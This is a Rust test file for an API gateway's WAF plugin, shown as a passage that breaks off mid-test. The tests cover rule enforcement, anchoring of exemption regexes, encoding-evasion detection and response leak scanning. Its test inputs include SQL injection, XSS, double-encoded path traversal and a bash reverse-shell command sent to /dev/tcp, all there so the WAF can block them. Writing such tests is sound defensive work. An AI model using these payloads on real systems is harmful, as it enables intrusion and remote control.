use ferrum_edge::_test_support::clone_log_metadata;
use ferrum_edge::plugins::waf::Waf;
use ferrum_edge::plugins::{
    Plugin, PluginFailurePolicy, PluginResult, RequestContext, plugin_failure_policy,
};
use serde_json::json;
use std::collections::HashMap;

fn ctx(method: &str, path: &str) -> RequestContext {
    RequestContext::new("203.0.113.10".into(), method.into(), path.into())
}

#[tokio::test]
async fn default_waf_monitors_sqli_query_without_blocking() {
    let plugin = Waf::new(&json!({})).unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%27%20OR%201%3D1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-SQLI-002"))
    );
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("monitored")
    );
}

#[tokio::test]
async fn clean_waf_evaluation_records_clean_action_for_metrics() {
    let plugin = Waf::new(&json!({})).unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=ordinary".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("clean")
    );
    assert!(!ctx.metadata.contains_key("waf.rule_hits"));
}

#[tokio::test]
async fn rule_mode_can_enforce_default_rule() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());

    let result = plugin.authorize(&mut ctx).await;

    match result {
        PluginResult::Reject {
            status_code, body, ..
        } => {
            assert_eq!(status_code, 403);
            assert_eq!(body, r#"{"error":"Forbidden"}"#);
        }
        other => panic!("expected reject, got {other:?}"),
    }
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("blocked")
    );
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-XSS-001")
    );
}

#[tokio::test]
async fn path_exemption_short_circuits_and_writes_no_waf_metadata() {
    let plugin = Waf::new(&json!({
        "global_exemptions": { "paths": ["/health*"] },
        "rule_modes": { "FE-SQLI-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/healthz");
    ctx.set_raw_query_string("q=%27%20OR%201%3D1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));
}

#[tokio::test]
async fn short_regex_exemption_does_not_disable_waf_on_unintended_paths() {
    // Regression for finding #7: a `~regex` exemption was matched UNANCHORED,
    // so a short pattern like `~api` exempted (and thus silently disabled the
    // entire WAF on) ANY path merely containing "api" — e.g. `/v1/api-keys`.
    // After start-anchoring, the exemption only applies to paths that BEGIN
    // with "api", so a SQLi payload on `/v1/api-keys` is still enforced.
    let plugin = Waf::new(&json!({
        "global_exemptions": { "paths": ["~api"] },
        "rule_modes": { "FE-SQLI-002": "enforce" }
    }))
    .unwrap();

    // Unintended path that merely CONTAINS "api": WAF must NOT be exempted.
    let mut unintended = ctx("GET", "/v1/api-keys");
    unintended.set_raw_query_string("q=%27%20OR%201%3D1".into());
    let result = plugin.authorize(&mut unintended).await;
    match result {
        PluginResult::Reject { status_code, .. } => assert_eq!(status_code, 403),
        other => panic!("expected WAF to enforce on unintended path, got {other:?}"),
    }
    assert!(
        unintended
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-SQLI-002")),
        "WAF must still inspect a path that only contains the exemption substring"
    );

    // Intended path that BEGINS with the pattern: still exempt (no WAF metadata).
    let mut intended = ctx("GET", "api/v1/list");
    intended.set_raw_query_string("q=%27%20OR%201%3D1".into());
    let result = plugin.authorize(&mut intended).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !intended.metadata.keys().any(|key| key.starts_with("waf.")),
        "a path beginning with the `~regex` exemption must still short-circuit"
    );
}

#[tokio::test]
async fn regex_alternation_exemption_anchors_all_branches() {
    // Regression for finding #7 (residual): a `~regex` exemption with a
    // top-level alternation must anchor EVERY branch. Before the `^(?:...)`
    // wrap, `~health|metrics` compiled to `^health|metrics` == `(^health)|
    // (metrics)`, leaving the `metrics` branch UNANCHORED — so it exempted (and
    // silently disabled the WAF on) any path merely containing "metrics", e.g.
    // `/v1/metrics-internal`.
    let plugin = Waf::new(&json!({
        "global_exemptions": { "paths": ["~health|metrics"] },
        "rule_modes": { "FE-SQLI-002": "enforce" }
    }))
    .unwrap();

    // Path containing the second alternation branch as a substring: NOT exempt.
    let mut unintended = ctx("GET", "/v1/metrics-internal");
    unintended.set_raw_query_string("q=%27%20OR%201%3D1".into());
    let result = plugin.authorize(&mut unintended).await;
    match result {
        PluginResult::Reject { status_code, .. } => assert_eq!(status_code, 403),
        other => panic!(
            "expected WAF to enforce on a path merely containing an alternation branch, got {other:?}"
        ),
    }
    assert!(
        unintended
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-SQLI-002")),
        "WAF must inspect a path that only contains an alternation branch substring"
    );

    // A path that BEGINS with an anchored branch is still exempt.
    let mut intended = ctx("GET", "metrics/list");
    intended.set_raw_query_string("q=%27%20OR%201%3D1".into());
    let result = plugin.authorize(&mut intended).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !intended.metadata.keys().any(|key| key.starts_with("waf.")),
        "a path beginning with an alternation branch must still short-circuit"
    );
}

#[tokio::test]
async fn waf_clears_preexisting_reserved_metadata_before_evaluation() {
    let plugin = Waf::new(&json!({})).unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.metadata
        .insert("waf.rule_hits".to_string(), "SPOOFED".to_string());
    ctx.metadata
        .insert("waf.action".to_string(), "blocked".to_string());
    ctx.metadata
        .insert("waf.severity".to_string(), "critical".to_string());
    ctx.set_raw_query_string("q=ordinary".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("clean")
    );
    assert!(!ctx.metadata.contains_key("waf.rule_hits"));
    assert!(!ctx.metadata.contains_key("waf.severity"));
}

#[tokio::test]
async fn consumer_scoped_request_rule_uses_authenticated_identity() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-CONSUMER-QUERY",
            "name": "consumer scoped query marker",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "conditions": { "consumers": ["alice"] },
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut anonymous_ctx = ctx("GET", "/search");
    anonymous_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut anonymous_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !anonymous_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-CONSUMER-QUERY"))
    );

    let mut authenticated_ctx = ctx("GET", "/search");
    authenticated_ctx.authenticated_identity = Some("alice".into());
    authenticated_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut authenticated_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        authenticated_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("CUSTOM-CONSUMER-QUERY")
    );
}

#[tokio::test]
async fn custom_rule_path_conditions_are_exact_unless_marked_as_prefix_or_regex() {
    let exact_plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-ADMIN-QUERY",
            "name": "admin query marker",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "conditions": { "paths": ["/admin"] },
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut suffix_ctx = ctx("GET", "/admin-public");
    suffix_ctx.set_raw_query_string("q=needle".into());
    let result = exact_plugin.authorize(&mut suffix_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!suffix_ctx.metadata.contains_key("waf.rule_hits"));

    let mut exact_ctx = ctx("GET", "/admin");
    exact_ctx.set_raw_query_string("q=needle".into());
    let result = exact_plugin.authorize(&mut exact_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));

    let prefix_plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-ADMIN-PREFIX",
            "name": "admin prefix query marker",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "conditions": { "paths": ["/admin*"] },
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut prefix_ctx = ctx("GET", "/admin-public");
    prefix_ctx.set_raw_query_string("q=needle".into());
    let result = prefix_plugin.authorize(&mut prefix_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn custom_rule_regex_path_conditions_remain_unanchored() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-API-QUERY",
            "name": "api query marker",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "conditions": { "paths": ["~api"] },
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut leading_slash_ctx = ctx("GET", "/api/users");
    leading_slash_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut leading_slash_ctx).await;
    assert!(
        matches!(result, PluginResult::Reject { .. }),
        "operator-authored `~api` rule conditions must still match normal paths containing api"
    );

    let mut embedded_ctx = ctx("GET", "/v1/api-keys");
    embedded_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut embedded_ctx).await;
    assert!(
        matches!(result, PluginResult::Reject { .. }),
        "rule conditions scope protections and must preserve unanchored regex semantics"
    );
}

#[tokio::test]
async fn request_body_scan_uses_context_aware_final_body_hook() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    assert!(plugin.requires_request_body_buffering());
    assert!(plugin.should_buffer_request_body(&ctx));

    let headers = ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"cmd":"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}"#,
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-CMD-002"))
    );
}

#[tokio::test]
async fn body_encoding_specials_trigger_buffering_without_body_rules() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "response_inspection": true,
        "response_body_inspection": true,
        "custom_rules": [{
            "id": "FE-ENCODING-001",
            "name": "Double URL encoding",
            "category": "encoding_evasion",
            "severity": "medium",
            "target": "full_url",
            "match_kind": "contains",
            "pattern": "%25",
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut req_ctx = ctx("POST", "/submit");
    req_ctx
        .headers
        .insert("content-type".into(), "text/plain".into());
    assert!(plugin.requires_request_body_buffering());
    assert!(plugin.should_buffer_request_body(&req_ctx));
    let headers = req_ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(&mut req_ctx, &headers, b"file=%252e%252e%252fetc")
        .await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        req_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("FE-ENCODING-001")
    );

    let mut binary_req_ctx = ctx("POST", "/upload");
    binary_req_ctx
        .headers
        .insert("content-type".into(), "application/octet-stream".into());
    assert!(!plugin.should_buffer_request_body(&binary_req_ctx));

    let mut resp_ctx = ctx("GET", "/download");
    let response_headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);
    assert!(plugin.requires_response_body_buffering());
    assert!(plugin.should_buffer_response_body(&resp_ctx));
    let result = plugin
        .on_final_response_body(
            &mut resp_ctx,
            200,
            &response_headers,
            b"file=%252e%252e%252fetc",
        )
        .await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        resp_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("FE-ENCODING-001")
    );

    let mut binary_resp_ctx = ctx("GET", "/download");
    let response_headers = HashMap::from([(
        "content-type".to_string(),
        "application/octet-stream".to_string(),
    )]);
    let result = plugin
        .on_final_response_body(
            &mut binary_resp_ctx,
            200,
            &response_headers,
            b"file=%252e%252e%252fetc",
        )
        .await;
    assert!(matches!(result, PluginResult::Continue));
}

#[tokio::test]
async fn highest_severity_is_preserved_across_scan_phases() {
    let plugin = Waf::new(&json!({
        "mode": "monitor",
        "include_default_rules": false,
        "custom_rules": [
            {
                "id": "CUSTOM-HIGH-QUERY",
                "name": "high query marker",
                "category": "custom",
                "severity": "high",
                "target": "query_values",
                "match_kind": "contains",
                "pattern": "high-marker",
                "action": "monitor"
            },
            {
                "id": "CUSTOM-LOW-BODY",
                "name": "low body marker",
                "category": "custom",
                "severity": "low",
                "target": "body_text",
                "match_kind": "contains",
                "pattern": "low-marker",
                "action": "monitor"
            }
        ]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.set_raw_query_string("q=high-marker".into());
    ctx.headers
        .insert("content-type".into(), "text/plain".into());

    assert!(matches!(
        plugin.authorize(&mut ctx).await,
        PluginResult::Continue
    ));
    assert_eq!(
        ctx.metadata.get("waf.severity").map(String::as_str),
        Some("high")
    );

    let headers = ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, b"low-marker")
        .await;

    assert!(matches!(result, PluginResult::Continue));
    assert_eq!(
        ctx.metadata.get("waf.severity").map(String::as_str),
        Some("high")
    );
}

#[tokio::test]
async fn custom_body_json_path_rule_scans_only_selected_value() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-JSON-1",
            "name": "message content marker",
            "category": "custom",
            "severity": "high",
            "target": { "type": "body_json_path", "path": "messages.0.content" },
            "match_kind": "contains",
            "pattern": "needle",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/chat");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"messages":[{"content":"needle here"}],"other":"clean"}"#,
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-JSON-1")
    );
}

#[tokio::test]
async fn body_json_path_rule_scans_decoded_variants() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-JSON-DECODED",
            "name": "encoded script marker",
            "category": "custom",
            "severity": "high",
            "target": { "type": "body_json_path", "path": "comment" },
            "match_kind": "contains",
            "pattern": "<script",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/chat");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"comment":"&lt;script&gt;alert(1)&lt;/script&gt;"}"#,
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-JSON-DECODED")
    );
}

#[tokio::test]
async fn body_luhn_and_cidr_rules_scan_decoded_variants() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [
            {
                "id": "CUSTOM-LUHN-BODY",
                "name": "encoded payment card",
                "category": "custom",
                "severity": "high",
                "target": "body_text",
                "match_kind": "luhn",
                "action": "enforce"
            },
            {
                "id": "CUSTOM-CIDR-BODY",
                "name": "encoded private address",
                "category": "custom",
                "severity": "high",
                "target": "body_text",
                "match_kind": "cidr",
                "pattern": "10.0.0.0/8",
                "action": "enforce"
            }
        ]
    }))
    .unwrap();
    let mut luhn_ctx = ctx("POST", "/submit");
    luhn_ctx
        .headers
        .insert("content-type".into(), "text/plain".into());
    let headers = luhn_ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut luhn_ctx,
            &headers,
            b"card=4111 1111 1111 111&#49;",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        luhn_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-LUHN-BODY"))
    );

    let mut cidr_ctx = ctx("POST", "/submit");
    cidr_ctx
        .headers
        .insert("content-type".into(), "text/plain".into());
    let headers = cidr_ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(&mut cidr_ctx, &headers, b"ip=10&#46;1&#46;2&#46;3")
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        cidr_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-CIDR-BODY"))
    );
}

#[tokio::test]
async fn decoded_body_rules_scan_lossy_utf8_bodies() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [
            {
                "id": "CUSTOM-SCRIPT-LOSSY",
                "name": "encoded script marker",
                "category": "custom",
                "severity": "high",
                "target": "body_text",
                "match_kind": "contains",
                "pattern": "<script",
                "action": "enforce"
            },
            {
                "id": "CUSTOM-LUHN-LOSSY",
                "name": "payment card in lossy text body",
                "category": "custom",
                "severity": "high",
                "target": "body_text",
                "match_kind": "luhn",
                "action": "enforce"
            }
        ]
    }))
    .unwrap();

    let mut encoded_ctx = ctx("POST", "/submit");
    encoded_ctx
        .headers
        .insert("content-type".into(), "text/plain".into());
    let headers = encoded_ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(&mut encoded_ctx, &headers, b"\xffq=%3Cscript%3E")
        .await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        encoded_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-SCRIPT-LOSSY"))
    );

    let mut luhn_ctx = ctx("POST", "/submit");
    luhn_ctx
        .headers
        .insert("content-type".into(), "text/plain".into());
    let headers = luhn_ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(&mut luhn_ctx, &headers, b"\xff4111111111111111")
        .await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        luhn_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-LUHN-LOSSY"))
    );
}

#[tokio::test]
async fn body_overlong_utf8_marker_is_flagged_as_encoding_evasion() {
    // Regression for finding #40: the overlong-UTF8 / double-encoding /
    // null-byte markers were only checked on the URL/path, never on bodies.
    // An overlong-UTF8-encoded body payload is lossy-decoded to U+FFFD rather
    // than the dangerous char and previously raised no signal. The body
    // encoding-evasion check now flags it via the dedicated FE-ENCODING-002
    // overlong marker rule, so rule_modes and overrides for that rule apply.
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "FE-ENCODING-002",
            "name": "Overlong UTF-8 marker",
            "category": "encoding_evasion",
            "severity": "medium",
            "target": "full_url",
            "match_kind": "contains",
            "pattern": "%c0",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "text/plain".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, b"path=%c0%ae%c0%aetarget")
        .await;

    match result {
        PluginResult::Reject { status_code, .. } => assert_eq!(status_code, 403),
        other => panic!("expected encoding-evasion enforce on body, got {other:?}"),
    }
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-ENCODING-002")),
        "overlong-UTF8 marker in a body must raise the encoding-evasion signal"
    );
}

#[tokio::test]
async fn body_double_encoding_marker_is_flagged_as_encoding_evasion() {
    // Companion to #40: a double-encoded marker (`%252e`) in a body — which
    // the URL-only check never inspected — is now flagged.
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-ENCODING-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "text/plain".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, b"file=%252e%252e%252fetc")
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-ENCODING-001"))
    );
}

#[tokio::test]
async fn body_beyond_cap_stacked_encoding_is_flagged_as_encoding_evasion() {
    // Regression for finding #39: an encoding stacked deeper than the layered-
    // decode round cap never reduces to its literal payload, so the body regex
    // set could not see it. The residual-encoding check now surfaces it as an
    // encoding-evasion signal instead of forwarding it silently.
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-ENCODING-001": "enforce" }
    }))
    .unwrap();

    // Quadruply-nested HTML entity (`&amp;amp;amp;lt;` -> ... -> `&lt;` after
    // the cap, never reaching `<`). This isolates the residual-encoding logic
    // from finding #40's byte markers: the payload contains NO `%`, so the
    // overlong/double/null marker checks cannot fire — only the beyond-cap
    // residual signal can flag it.
    let mut deep_ctx = ctx("POST", "/submit");
    deep_ctx
        .headers
        .insert("content-type".into(), "text/plain".into());
    let headers = deep_ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(
            &mut deep_ctx,
            &headers,
            b"q=&amp;amp;amp;lt;script&amp;amp;amp;gt;",
        )
        .await;
    match result {
        PluginResult::Reject { status_code, .. } => assert_eq!(status_code, 403),
        other => panic!("expected beyond-cap stacked encoding to be flagged, got {other:?}"),
    }
    assert!(
        deep_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-ENCODING-001"))
    );

    // A quad percent-encoded payload is also still encoded after the cap and is
    // flagged too (here both the residual and the `%25` double-encoding marker
    // apply, but the assertion only needs the FE-ENCODING signal to fire).
    let mut deep_pct = ctx("POST", "/submit");
    deep_pct
        .headers
        .insert("content-type".into(), "text/plain".into());
    let headers = deep_pct.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(
            &mut deep_pct,
            &headers,
            b"q=%2525253Cscript%2525253Ealert(1)",
        )
        .await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        deep_pct
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-ENCODING-001"))
    );

    // Negative control: a body with no encoding markers and no deep stacking
    // must NOT raise the encoding-evasion signal (the residual check is precise
    // and does not false-positive on benign text). A bare `+` is a decodable
    // marker but decodes cleanly within the cap.
    let mut clean_ctx = ctx("POST", "/submit");
    clean_ctx
        .headers
        .insert("content-type".into(), "text/plain".into());
    let headers = clean_ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(&mut clean_ctx, &headers, b"q=hello+world")
        .await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(
        clean_ctx
            .metadata
            .get("waf.rule_hits")
            .is_none_or(|hits| !hits.contains("FE-ENCODING-001")),
        "a body that decodes cleanly within the cap must not raise the residual signal"
    );
}

#[tokio::test]
async fn cidr_text_rules_are_scoped_to_their_configured_target() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-CIDR-HEADER",
            "name": "private forwarding address",
            "category": "custom",
            "severity": "high",
            "target": { "type": "header_values", "names": ["x-forwarded-for"] },
            "match_kind": "cidr",
            "pattern": "10.0.0.0/8",
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut query_ctx = ctx("GET", "/search");
    query_ctx.set_raw_query_string("ip=10.1.2.3".into());
    let result = plugin.authorize(&mut query_ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !query_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-CIDR-HEADER"))
    );

    let mut header_ctx = ctx("GET", "/search");
    header_ctx
        .headers
        .insert("x-forwarded-for".into(), "10.1.2.3".into());
    let result = plugin.authorize(&mut header_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        header_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-HEADER")
    );
}

#[tokio::test]
async fn cidr_rules_match_common_ip_with_port_forms() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [
            {
                "id": "CUSTOM-CIDR-IPV4-PORT",
                "name": "private forwarding address with port",
                "category": "custom",
                "severity": "high",
                "target": { "type": "header_values", "names": ["x-forwarded-for"] },
                "match_kind": "cidr",
                "pattern": "10.0.0.0/8",
                "action": "enforce"
            },
            {
                "id": "CUSTOM-CIDR-IPV6-PORT",
                "name": "documentation ipv6 address with port",
                "category": "custom",
                "severity": "high",
                "target": { "type": "header_values", "names": ["x-forwarded-for"] },
                "match_kind": "cidr",
                "pattern": "2001:db8::/32",
                "action": "enforce"
            }
        ]
    }))
    .unwrap();

    let mut ipv4_ctx = ctx("GET", "/search");
    ipv4_ctx
        .headers
        .insert("x-forwarded-for".into(), "10.1.2.3:8443".into());
    let result = plugin.authorize(&mut ipv4_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ipv4_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-IPV4-PORT")
    );

    let mut ipv6_ctx = ctx("GET", "/search");
    ipv6_ctx
        .headers
        .insert("x-forwarded-for".into(), "[2001:db8::1]:443".into());
    let result = plugin.authorize(&mut ipv6_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ipv6_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-IPV6-PORT")
    );
}

#[tokio::test]
async fn response_header_cidr_rule_matches_without_regex_header_rules() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "response_inspection": true,
        "custom_rules": [{
            "id": "CUSTOM-CIDR-RESP",
            "name": "private upstream header",
            "category": "custom",
            "severity": "medium",
            "target": "response_headers",
            "match_kind": "cidr",
            "pattern": "10.0.0.0/8",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/debug");
    let mut headers = HashMap::from([("x-upstream-ip".to_string(), "10.2.3.4".to_string())]);

    let result = plugin.after_proxy(&mut ctx, 200, &mut headers).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-RESP")
    );
}

#[tokio::test]
async fn response_body_inspection_is_off_by_default() {
    let plugin = Waf::new(&json!({})).unwrap();
    let ctx = ctx("GET", "/");
    assert!(!plugin.requires_response_body_buffering());
    assert!(!plugin.should_buffer_response_body(&ctx));
}

#[tokio::test]
async fn response_body_scan_detects_sensitive_data_when_enabled() {
    let plugin = Waf::new(&json!({
        "response_inspection": true,
        "response_body_inspection": true,
        "rule_modes": { "FE-DATA-LEAK-006": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/debug");
    let headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);

    let result = plugin
        .on_final_response_body(
            &mut ctx,
            200,
            &headers,
            b"-----BEGIN PRIVATE KEY-----\nsecret\n-----END PRIVATE KEY-----",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-DATA-LEAK-006"))
    );
}

#[tokio::test]
async fn response_luhn_and_cidr_rules_scan_decoded_variants() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "response_inspection": true,
        "response_body_inspection": true,
        "custom_rules": [
            {
                "id": "CUSTOM-LUHN-RESP",
                "name": "encoded response payment card",
                "category": "custom",
                "severity": "high",
                "target": "response_body",
                "match_kind": "luhn",
                "action": "enforce"
            },
            {
                "id": "CUSTOM-CIDR-RESP-BODY",
                "name": "encoded response private address",
                "category": "custom",
                "severity": "high",
                "target": "response_body",
                "match_kind": "cidr",
                "pattern": "10.0.0.0/8",
                "action": "enforce"
            }
        ]
    }))
    .unwrap();
    let headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);

    let mut luhn_ctx = ctx("GET", "/debug");
    let result = plugin
        .on_final_response_body(
            &mut luhn_ctx,
            200,
            &headers,
            b"card=4111 1111 1111 111&#49;",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        luhn_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-LUHN-RESP"))
    );

    let mut cidr_ctx = ctx("GET", "/debug");
    let result = plugin
        .on_final_response_body(&mut cidr_ctx, 200, &headers, b"ip=10&#46;2&#46;3&#46;4")
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        cidr_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-CIDR-RESP-BODY"))
    );
}

#[tokio::test]
async fn decoded_response_body_rules_scan_lossy_utf8_bodies() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "response_inspection": true,
        "response_body_inspection": true,
        "custom_rules": [{
            "id": "CUSTOM-RESP-LOSSY",
            "name": "encoded response marker",
            "category": "custom",
            "severity": "high",
            "target": "response_body",
            "match_kind": "contains",
            "pattern": "<script",
            "action": "enforce"
        }]
    }))
    .unwrap();
